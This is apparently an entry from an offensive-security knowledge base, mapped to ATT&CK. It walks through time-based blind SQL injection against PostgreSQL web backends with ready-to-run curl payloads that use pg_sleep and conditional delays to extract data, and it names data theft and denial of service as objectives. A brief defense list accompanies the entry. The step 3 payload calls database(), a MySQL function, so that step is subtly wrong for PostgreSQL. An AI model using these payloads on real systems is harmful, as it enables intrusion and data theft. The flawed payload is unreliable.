---
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:35.835378+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - sqli
  - time-based
  - postgresql
  - blind-injection
  - database
commands:
  - '[[commands/curl-inject-postgresql-sleep-payload]]'
platforms:
  - Web
  - Linux
tools: []
validated: true
---

# PostgreSQL-Time-Based-Blind-SQL-Injection

## Summary

This procedure demonstrates how to perform time-based blind SQL injection against a PostgreSQL database backend to confirm vulnerabilities and extract information without visible error messages or data output. By injecting payloads that cause conditional delays using the pg_sleep function, attackers can infer database content based on response times, enabling data exfiltration or denial-of-service in vulnerable web applications.

## Description

Time-based blind SQL injection exploits insufficient input validation in web applications connected to PostgreSQL databases, where direct data retrieval isn't possible due to no error messages or output. The technique relies on timing differences: successful injections trigger delays (e.g., via pg_sleep), while failures do not. This allows boolean-based inference of data, such as character-by-character extraction of table contents. Commonly targeted in login forms, search fields, or URL parameters, this method maps to MITRE ATT&CK technique T1190 (Exploit Public-Facing Application) under tactics TA0002 (Execution) and TA0009 (Collection). It requires a vulnerable endpoint but no prior credentials, making it suitable for initial access or reconnaissance in web environments.

## Requirements

1. Network access to a web application using PostgreSQL as the backend database.
2. Identification of a potentially injectable parameter (e.g., via manual testing or tools like Burp Suite).
3. Basic knowledge of SQL syntax and HTTP request manipulation (e.g., using curl or a proxy).
4. A timing tool or stopwatch to measure response delays accurately.

## Defense

- Use prepared statements and parameterized queries in application code to separate SQL logic from user input.
- Implement web application firewalls (WAFs) to detect and block suspicious SQL patterns like pg_sleep.
- Enable database logging for long-running queries and monitor for anomalies in execution times.
- Apply least-privilege access to database users and regularly audit application inputs.

## Objectives

1. Confirm the presence of a time-based SQL injection vulnerability.
2. Extract sensitive data from the database through conditional timing inferences.
3. Potentially cause a denial-of-service by inducing repeated delays.

## Instructions

### Step 1: Identify the Injection Point

**Context**: Locate a user-controllable input field (e.g., a search parameter or ID in a URL/POST body) that interacts with the PostgreSQL database. Test for basic SQL injection by appending a single quote or comment to see if the application behaves differently, indicating unescaped input.

**Command** ([[commands/curl-inject-postgresql-sleep-payload]]):
```bash
curl -X POST http://target.com/vulnerable-endpoint -d "id=1'" -w "%{time_total}s"
```

> This sends a basic test payload and measures the total response time. A significant change in behavior (e.g., error or delay) confirms potential injectability. Expected output: Standard page response under 1 second if sanitized; anomalies if vulnerable.

### Step 2: Confirm Time-Based Vulnerability

**Context**: Inject a delay payload to verify if the database executes arbitrary functions like pg_sleep. If the response is delayed by the specified amount (e.g., 5 seconds), the injection works; otherwise, adjust for filtering.

**Code** ([[codes/PostgreSQL-pg-sleep-Delay-Payload]]):
Embed the payload in the vulnerable parameter, e.g., id=1; select 1 from pg_sleep(5)--.

**Command** ([[commands/curl-inject-postgresql-sleep-payload]]):
```bash
curl -X POST http://target.com/vulnerable-endpoint -d "id=1; select 1 from pg_sleep(5)--" -w "%{time_total}s"
```

> Run this and time the response. Expected output: Response delayed by approximately 5 seconds, confirming execution of pg_sleep. No delay indicates blocking or non-vulnerable.

### Step 3: Extract Data via Conditional Delays

**Context**: Use boolean conditions with delays to infer data bit-by-bit. For example, test if a character's ASCII value meets a condition; delay on true, no delay on false. Iterate to reconstruct strings like usernames or passwords.

**Command** ([[commands/curl-inject-postgresql-sleep-payload]]):
```bash
curl -X POST http://target.com/vulnerable-endpoint -d "id=1 AND (CASE WHEN (SUBSTRING((SELECT database()),1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END)--" -w "%{time_total}s"
```

> This tests if the first character of the database name is 'p' (PostgreSQL often starts with 'p'). Delay confirms true. Expected output: 5-second delay if condition true, near-instant if false. Repeat with binary search or character sets to extract full data.
